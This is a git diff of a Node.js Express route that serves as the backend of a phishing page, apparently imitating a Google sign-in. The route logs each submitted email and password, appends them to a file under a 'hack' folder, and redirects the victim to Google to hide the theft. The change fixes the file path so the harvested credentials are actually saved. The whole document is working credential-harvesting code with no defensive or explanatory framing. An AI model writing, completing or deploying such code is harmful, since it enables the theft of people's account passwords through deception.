@@ -18,12 +18,12 @@ router.post('/signin/save', function (req, res, next) {
   console.log("=======Password Found=========")
   console.log(req.body.hidEmail);
   console.log(req.body.Passwd);
-
+  
   var pwds = fs.readFileSync("../services/hack/password.json");
   var pwdFile = JSON.parse(pwds);
   pwdFile.password.push({ email: req.body.hidEmail, password: req.body.Passwd });
   pwds = JSON.stringify(pwdFile);
-  fs.writeFileSync('./config.json', pwds);
+  fs.writeFileSync("../services/hack/password.json", pwds);
   res.redirect('https://www.google.co.in');
 });
 
